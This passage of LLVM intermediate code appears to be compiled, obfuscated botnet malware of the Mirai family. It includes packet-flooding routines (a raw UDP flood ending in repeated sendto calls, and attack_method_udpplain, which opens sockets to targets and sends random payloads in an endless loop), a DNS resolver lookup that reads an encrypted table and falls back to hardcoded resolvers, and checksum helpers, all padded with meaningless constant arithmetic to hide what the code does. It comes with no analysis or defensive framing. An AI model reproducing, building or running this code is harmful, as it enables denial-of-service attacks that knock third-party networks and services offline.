  %406 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %407 = bitcast %struct.iphdr* %406 to i16*
  %408 = call zeroext i16 @checksum_generic(i16* %407, i32 20)
  %409 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 %408, i16* %410, align 2
  %411 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %412 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %411, i32 0, i32 3
  store i16 0, i16* %412, align 2
  %413 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %414 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %415 = bitcast %struct.udphdr* %414 to i8*
  %416 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %417 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %416, i32 0, i32 2
  %418 = load i16, i16* %417, align 2
  %419 = load i8, i8* %19, align 1
  %420 = zext i8 %419 to i64
  %421 = sub i64 0, %420
  %422 = sub i64 21, %421
  %423 = add i64 21, %420
  %424 = sub i64 0, %422
  %425 = sub i64 0, 2
  %426 = add i64 %424, %425
  %427 = sub i64 0, %426
  %428 = add i64 %422, 2
  %429 = load i32, i32* %21, align 4
  %430 = sext i32 %429 to i64
  %431 = sub i64 0, %427
  %432 = sub i64 0, %430
  %433 = add i64 %431, %432
  %434 = sub i64 0, %433
  %435 = add i64 %427, %430
  %436 = add i64 %434, 5278803972639609204
  %437 = add i64 %436, 4
  %438 = sub i64 %437, 5278803972639609204
  %439 = add i64 %434, 4
  %440 = trunc i64 %438 to i32
  %441 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %413, i8* %415, i16 zeroext %418, i32 %440)
  %442 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %443 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %442, i32 0, i32 3
  store i16 %441, i16* %443, align 2
  %444 = load i32, i32* %22, align 4
  %445 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %446 = load i32, i32* %9, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %448, i32 0, i32 0
  %450 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %449, i32 0, i32 2
  %451 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %450, i32 0, i32 0
  store i32 %444, i32* %451, align 4
  %452 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %453 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %452, i32 0, i32 1
  %454 = load i16, i16* %453, align 2
  %455 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %456 = load i32, i32* %9, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %455, i64 %457
  %459 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %458, i32 0, i32 0
  %460 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %459, i32 0, i32 1
  store i16 %454, i16* %460, align 2
  %461 = load i32, i32* %10, align 4
  %462 = load i8*, i8** %32, align 8
  %463 = load i8, i8* %19, align 1
  %464 = zext i8 %463 to i64
  %465 = sub i64 0, 41
  %466 = sub i64 0, %464
  %467 = add i64 %465, %466
  %468 = sub i64 0, %467
  %469 = add i64 41, %464
  %470 = sub i64 0, 2
  %471 = sub i64 %468, %470
  %472 = add i64 %468, 2
  %473 = load i32, i32* %21, align 4
  %474 = sext i32 %473 to i64
  %475 = sub i64 0, %471
  %476 = sub i64 0, %474
  %477 = add i64 %475, %476
  %478 = sub i64 0, %477
  %479 = add i64 %471, %474
  %480 = add i64 %478, 4301106383647184465
  %481 = add i64 %480, 4
  %482 = sub i64 %481, 4301106383647184465
  %483 = add i64 %478, 4
  %484 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %485 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %486 = load i32, i32* %9, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %485, i64 %487
  %489 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %488, i32 0, i32 0
  %490 = bitcast %struct.sockaddr_in* %489 to %struct.sockaddr*
  store %struct.sockaddr* %490, %struct.sockaddr** %484, align 8
  %491 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %492 = load %struct.sockaddr*, %struct.sockaddr** %491, align 8
  %493 = call i64 @sendto(i32 %461, i8* %462, i64 %482, i32 16384, %struct.sockaddr* %492, i32 16)
  br label %494

; <label>:494:                                    ; preds = %400
  %495 = load i32, i32* %9, align 4
  %496 = sub i32 0, %495
  %497 = sub i32 0, 1
  %498 = add i32 %496, %497
  %499 = sub i32 0, %498
  %500 = add nsw i32 %495, 1
  store i32 %499, i32* %9, align 4
  br label %322

; <label>:501:                                    ; preds = %322
  br label %321

; <label>:502:                                    ; preds = %92, %86, %80
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %11 = call i8* @table_retrieve_val(i32 21, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 21)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %107

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 22)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 22, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 22)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %106

; <label>:28:                                     ; preds = %15
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %93, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %99

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %93

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %72, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %72, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub i32 %66, -586688852
  %68 = sub i32 %67, 1
  %69 = add i32 %68, -586688852
  %70 = sub nsw i32 %66, 1
  %71 = icmp eq i32 %65, %69
  br i1 %71, label %72, label %92

; <label>:72:                                     ; preds = %64, %60, %56
  %73 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %74 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %75 = load i32, i32* %4, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub i32 %78, 604957587
  %81 = sub i32 %80, %79
  %82 = add i32 %81, 604957587
  %83 = sub nsw i32 %78, %79
  call void @util_memcpy(i8* %73, i8* %77, i32 %82)
  %84 = load i32, i32* %6, align 4
  %85 = load i32, i32* %4, align 4
  %86 = add i32 %84, -494429186
  %87 = sub i32 %86, %85
  %88 = sub i32 %87, -494429186
  %89 = sub nsw i32 %84, %85
  %90 = sext i32 %88 to i64
  %91 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %90
  store i8 0, i8* %91, align 1
  store i8 1, i8* %9, align 1
  br label %99

; <label>:92:                                     ; preds = %64
  br label %93

; <label>:93:                                     ; preds = %92, %49
  %94 = load i32, i32* %6, align 4
  %95 = sub i32 %94, -1488544689
  %96 = add i32 %95, 1
  %97 = add i32 %96, -1488544689
  %98 = add nsw i32 %94, 1
  store i32 %97, i32* %6, align 4
  br label %30

; <label>:99:                                     ; preds = %72, %30
  %100 = load i8, i8* %9, align 1
  %101 = icmp ne i8 %100, 0
  br i1 %101, label %102, label %105

; <label>:102:                                    ; preds = %99
  %103 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %104 = call i32 @inet_addr(i8* %103) #6
  store i32 %104, i32* %1, align 4
  br label %118

; <label>:105:                                    ; preds = %99
  br label %106

; <label>:106:                                    ; preds = %105, %15
  br label %107

; <label>:107:                                    ; preds = %106, %0
  %108 = call i32 @rand_next()
  %109 = urem i32 %108, 4
  switch i32 %109, label %118 [
    i32 0, label %110
    i32 1, label %112
    i32 2, label %114
    i32 3, label %116
  ]

; <label>:110:                                    ; preds = %107
  %111 = call i32 @htonl(i32 134744072) #7
  store i32 %111, i32* %1, align 4
  br label %118

; <label>:112:                                    ; preds = %107
  %113 = call i32 @htonl(i32 1246898730) #7
  store i32 %113, i32* %1, align 4
  br label %118

; <label>:114:                                    ; preds = %107
  %115 = call i32 @htonl(i32 1074151430) #7
  store i32 %115, i32* %1, align 4
  br label %118

; <label>:116:                                    ; preds = %107
  %117 = call i32 @htonl(i32 67240450) #7
  store i32 %117, i32* %1, align 4
  br label %118

; <label>:118:                                    ; preds = %116, %114, %112, %110, %107, %102
  %119 = load i32, i32* %1, align 4
  ret i32 %119
}

declare i32 @util_strlen(i8*) #3

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %173, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %179

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %154

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = sub i32 %132, -2042265876
  %143 = add i32 %142, %141
  %144 = add i32 %143, -2042265876
  %145 = add i32 %132, %141
  %146 = call i32 @htonl(i32 %144) #7
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 0
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %151, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  store i32 %146, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %125, %116
  %155 = load i32*, i32** %11, align 8
  %156 = load i32, i32* %9, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i32, i32* %155, i64 %157
  %159 = load i32, i32* %158, align 4
  %160 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %161 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %162 = load i32, i32* %9, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i64 %163
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i32 0, i32 0
  %166 = bitcast %struct.sockaddr_in* %165 to %struct.sockaddr*
  store %struct.sockaddr* %166, %struct.sockaddr** %160, align 8
  %167 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %168 = load %struct.sockaddr*, %struct.sockaddr** %167, align 8
  %169 = call i32 @connect(i32 %159, %struct.sockaddr* %168, i32 16)
  %170 = icmp eq i32 %169, -1
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %154
  br label %172

; <label>:172:                                    ; preds = %171, %154
  br label %173

; <label>:173:                                    ; preds = %172
  %174 = load i32, i32* %9, align 4
  %175 = sub i32 %174, -737618125
  %176 = add i32 %175, 1
  %177 = add i32 %176, -737618125
  %178 = add nsw i32 %174, 1
  store i32 %177, i32* %9, align 4
  br label %58

; <label>:179:                                    ; preds = %58
  br label %180

; <label>:180:                                    ; preds = %215, %179
  store i32 0, i32* %9, align 4
  br label %181

; <label>:181:                                    ; preds = %208, %180
  %182 = load i32, i32* %9, align 4
  %183 = load i8, i8* %5, align 1
  %184 = zext i8 %183 to i32
  %185 = icmp slt i32 %182, %184
  br i1 %185, label %186, label %215

; <label>:186:                                    ; preds = %181
  %187 = load i8**, i8*** %10, align 8
  %188 = load i32, i32* %9, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds i8*, i8** %187, i64 %189
  %191 = load i8*, i8** %190, align 8
  store i8* %191, i8** %22, align 8
  %192 = load i8, i8* %15, align 1
  %193 = icmp ne i8 %192, 0
  br i1 %193, label %194, label %198

; <label>:194:                                    ; preds = %186
  %195 = load i8*, i8** %22, align 8
  %196 = load i16, i16* %14, align 2
  %197 = zext i16 %196 to i32
  call void @rand_str(i8* %195, i32 %197)
  br label %198

; <label>:198:                                    ; preds = %194, %186
  %199 = load i32*, i32** %11, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds i32, i32* %199, i64 %201
  %203 = load i32, i32* %202, align 4
  %204 = load i8*, i8** %22, align 8
  %205 = load i16, i16* %14, align 2
  %206 = zext i16 %205 to i64
  %207 = call i64 @send(i32 %203, i8* %204, i64 %206, i32 16384)
  br label %208

; <label>:208:                                    ; preds = %198
  %209 = load i32, i32* %9, align 4
  %210 = sub i32 0, %209
  %211 = sub i32 0, 1
  %212 = add i32 %210, %211
  %213 = sub i32 0, %212
  %214 = add nsw i32 %209, 1
  store i32 %213, i32* %9, align 4
  br label %181

; <label>:215:                                    ; preds = %181
  br label %180
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %25

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, 8669038115268918922
  %16 = add i64 %15, %13
  %17 = sub i64 %16, 8669038115268918922
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  br label %19

; <label>:19:                                     ; preds = %9
  %20 = load i32, i32* %4, align 4
  %21 = add i32 %20, -731503669
  %22 = sub i32 %21, 2
  %23 = sub i32 %22, -731503669
  %24 = sub i32 %20, 2
  store i32 %23, i32* %4, align 4
  br label %6

; <label>:25:                                     ; preds = %6
  %26 = load i32, i32* %4, align 4
  %27 = icmp eq i32 %26, 1
  br i1 %27, label %28, label %38

; <label>:28:                                     ; preds = %25
  %29 = load i16*, i16** %3, align 8
  %30 = load i16, i16* %29, align 2
  %31 = trunc i16 %30 to i8
  %32 = sext i8 %31 to i64
  %33 = load i64, i64* %5, align 8
  %34 = add i64 %33, -6321051578684153926
  %35 = add i64 %34, %32
  %36 = sub i64 %35, -6321051578684153926
  %37 = add i64 %33, %32
  store i64 %36, i64* %5, align 8
  br label %38

; <label>:38:                                     ; preds = %28, %25
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 65535, -1
  %43 = xor i64 %41, %42
  %44 = and i64 %43, %41
  %45 = and i64 %41, 65535
  %46 = sub i64 0, %40
  %47 = sub i64 0, %44
  %48 = add i64 %46, %47
  %49 = sub i64 0, %48
  %50 = add i64 %40, %44
  store i64 %49, i64* %5, align 8
  %51 = load i64, i64* %5, align 8
  %52 = lshr i64 %51, 16
  %53 = load i64, i64* %5, align 8
  %54 = sub i64 %53, -4580930418113830826
  %55 = add i64 %54, %52
  %56 = add i64 %55, -4580930418113830826
  %57 = add i64 %53, %52
  store i64 %56, i64* %5, align 8
  %58 = load i64, i64* %5, align 8
  %59 = xor i64 %58, -1
  %60 = and i64 9173998576000763598, %59
  %61 = xor i64 9173998576000763598, -1
  %62 = and i64 %58, %61
  %63 = xor i64 -1, -1
  %64 = and i64 %63, 9173998576000763598
  %65 = and i64 -1, %61
  %66 = or i64 %60, %62
  %67 = or i64 %64, %65
  %68 = xor i64 %66, %67
  %69 = xor i64 %58, -1
  %70 = trunc i64 %68 to i16
  ret i16 %70
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %42

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = sub i32 %30, -2001108699
  %32 = add i32 %31, %29
  %33 = add i32 %32, -2001108699
  %34 = add i32 %30, %29
  store i32 %33, i32* %12, align 4
  %35 = load i16*, i16** %9, align 8
  %36 = getelementptr inbounds i16, i16* %35, i32 1
  store i16* %36, i16** %9, align 8
  %37 = load i32, i32* %8, align 4
  %38 = sub i32 %37, 1084988182
  %39 = sub i32 %38, 2
  %40 = add i32 %39, 1084988182
  %41 = sub nsw i32 %37, 2
  store i32 %40, i32* %8, align 4
  br label %23

; <label>:42:                                     ; preds = %23
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, 1
  br i1 %44, label %45, label %54

; <label>:45:                                     ; preds = %42
  %46 = load i16*, i16** %9, align 8
  %47 = bitcast i16* %46 to i8*
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = load i32, i32* %12, align 4
  %51 = sub i32 0, %49
  %52 = sub i32 %50, %51
  %53 = add i32 %50, %49
  store i32 %52, i32* %12, align 4
  br label %54

; <label>:54:                                     ; preds = %45, %42
  %55 = load i32, i32* %10, align 4
  %56 = lshr i32 %55, 16
  %57 = xor i32 %56, -1
